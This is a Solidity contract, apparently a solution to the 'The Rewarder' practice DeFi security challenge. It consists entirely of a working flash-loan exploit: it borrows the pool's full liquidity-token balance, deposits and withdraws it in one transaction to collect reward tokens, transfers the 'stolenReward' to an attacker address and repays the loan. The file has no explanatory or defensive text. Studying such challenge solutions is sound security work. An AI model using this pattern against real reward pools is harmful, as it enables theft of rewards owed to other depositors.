// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract Exploit_TheRewarder {
    address attackerEOA;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    ITheRewarderPool rewardPool;
    IFlashLoanerPool flashLoanPool;

    constructor(
        address _attackerEOA,
        IERC20 _liquidityToken,
        IERC20 _rewardToken,
        ITheRewarderPool _rewardPool,
        IFlashLoanerPool _flashLoanPool
    ) {
        attackerEOA = _attackerEOA;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        rewardPool = _rewardPool;
        flashLoanPool = _flashLoanPool;
    }

    function exploit() public {
        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(amount);
    }

    //callback IFlashLoanerPool:flashLoan()
    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewardPool), amount);

        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        uint256 stolenReward = rewardToken.balanceOf(address(this));
        require(stolenReward > 0, "Could not steal the funds.");
        rewardToken.transfer(attackerEOA, stolenReward);
        //return the flash loan
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
